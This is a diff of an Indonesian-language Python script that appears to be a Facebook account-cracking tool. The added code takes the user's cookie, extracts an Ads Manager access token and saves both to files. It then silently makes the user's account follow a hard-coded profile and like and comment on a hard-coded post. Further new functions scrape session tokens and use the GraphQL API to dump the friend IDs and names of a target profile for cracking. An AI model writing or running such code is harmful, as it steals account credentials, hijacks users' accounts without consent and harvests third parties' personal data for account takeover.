@@ -904,7 +904,7 @@ def login():
         login123()
 
 ###-----[ BAGIAN LOGIN ]-----###
-def logincoki():
+def logincokii():
 	try:
 		cok = Console().input(f" {H2}• {P2}cookie : ")
 		open('.fancookie.txt', 'w').write(cok)
@@ -946,16 +946,37 @@ def logincoki():
 		print(e)
 		exit()
 
+# --------------------[ LOGIN-TOKEN-EAAB ]--------------#
+def logincoki():
+    try:
+        cok = Console().input(f" {H2}• {P2}cookie : ")
+        cookie = {'cookie':cok}
+        open(".fancookie.txt","w").write(cok)
+        with requests.Session() as xyz:
+            url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+            req = xyz.get(url,cookies=cookie)
+            set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
+            nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
+            roq = xyz.get(nek,cookies=cookie)
+            tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+            open(".fantoken.txt","w").write(tok)
+            bot_komen(cok, tok)
+            Console().print(Panel(f"""{P2}{tok}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
+            Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
+            exit()
+    except Exception as e:
+        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
+        exit()
 # --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
 def bot_komen(cok, ken):
 	with requests.Session() as r:
 		text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
 		r.cookies.update({'cookie': cok})
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
-		#r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
+		# r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
 		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
 		r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
-		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
+		# r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
 # ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
 def bot_follow():
 	with requests.Session() as r:
@@ -978,9 +999,10 @@ def menu():
         time.sleep(3)
         login()
     try:
-        sy = requests.get(f'https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cookie})
-        my_name = json.loads(sy.text)['name']
-        my_id = json.loads(sy.text)['id']
+        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
+        req = ses.get('https://www.facebook.com/profile.php', headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
+        my_id = re.search('"userID":"(.*?)"', str(req)).group(1)
+        my_name = re.search('"NAME":"(.*?)"', str(req)).group(1)
     except:
         my_name=[]
         my_id=[]
@@ -1021,7 +1043,10 @@ def menu():
 [{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
     HaHi = console.input(f" {H2}• {P2}pilih menu : ")
     if HaHi in ["1", "01"]:
-        dump_publik()
+        console.prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
+        idt = console.input(f" {H2}• {P2}Masukan Id Target : ")
+        url = f'https://www.facebook.com/{idt}'
+        dump_publik(cookie,url)
     elif HaHi in ["2", "02"]:
         massal()
     elif HaHi in ["3", "03"]:
@@ -1035,8 +1060,73 @@ def menu():
     	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")
 
 
+
+# ----------------[ BAGIAN-DATA-GRAPHQL ]----------------#
+def GetData(req):
+    av = re.search('"actorID":"(.*?)"',str(req)).group(1)
+    __user = av
+    __a = str(random.randrange(1,6))
+    __hs = re.search('"haste_session":"(.*?)"',str(req)).group(1)
+    __ccg = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
+    __rev = re.search('"__spin_r":(.*?),',str(req)).group(1)
+    __spin_r = __rev
+    __spin_b = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
+    __spin_t = re.search('"__spin_t":(.*?),',str(req)).group(1)
+    __hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
+    fb_dtsg = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1)
+    jazoest = re.search('jazoest=(.*?)"',str(req)).group(1)
+    lsd = re.search(r'"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
+    Data = {'av':av,'__user':__user,'__a':__a,'__hs':__hs,'dpr':'1.5','__ccg':__ccg,'__rev':__rev,'__spin_r':__spin_r,'__spin_b':__spin_b,'__spin_t':__spin_t,'__hsi':__hsi,'__comet_req':'15','fb_dtsg':fb_dtsg,'jazoest':jazoest,'lsd':lsd}
+    return(Data)
+# ----------------[ BAGIAN-DUMP-GRAPHQL ]----------------#
+def dump_publik(cookie,url):
+    try:
+        session = requests.Session()
+        # cookie = open("co.txt", "r").read()
+        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
+        req = session.get(url, headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
+        Data = GetData(req)
+        flid = re.search('{"tab_key":"friends_all","id":"(.*?)"}',str(req)).group(1)
+        Data.update({'fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery','server_timestamps': True,'doc_id': '6709724792472394'})
+        cursor = None
+        loop=0
+        # Iterasi pengambilan data selama ada halaman berikutnya
+        while True:
+            Data.update({'variables': json.dumps({"count": 8,"cursor": cursor,"scale": 1.5,"search": None,"id": flid})})
+            head = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Sec-Ch-Prefers-Color-Scheme': 'dark', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Model': '', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
+            response = session.post('https://www.facebook.com/api/graphql/',data=Data, headers=head, cookies={'cookie': cookie})
+            pos = response.json()
+            for x in pos['data']['node']['pageItems']['edges']:
+                try:
+                    profile = x['node']['actions_renderer']['action']['client_handler']['profile_action']['restrictable_profile_owner']
+                    friend_id = profile['id']
+                    name = profile['name']
+                    fm = f'{friend_id}|{name}'
+                    if fm not in id:
+                        id.append(fm)
+                        loop += 1
+                        print('\r • sedang proses mengumpulkan id, berhasil mendapatkan {} ID'.format(loop), end=''); sys.stdout.flush()
+                except Exception:
+                    pass
+            if pos['data']['node']['pageItems']['page_info']['has_next_page']:
+                cursor = pos['data']['node']['pageItems']['page_info']['end_cursor']
+            else:
+                break
+        # Setelah proses dump selesai
+        if loop == 0:
+            console.print(f" \r{H2}• {P2}Failed To Dump ID!")
+        else:
+            print()
+            # console.print(f" \r{H2}• {P2}Success Dump {loop} ID")
+        # Panggil fungsi setting dengan mengirim list id
+        setting()
+    except Exception as e:
+        console.print(f" {H2}• {P2}Error, Something Went Wrong!\n", str(e))
+        exit()
+	    
+
 #----------[ CRACK-PUBLIK  ]----------#
-def dump_publik():
+def dump_publikk():
     with requests.Session() as ses:
         token = open(".fantoken.txt", "r").read()
         cok = open(".fancookie.txt", "r").read()
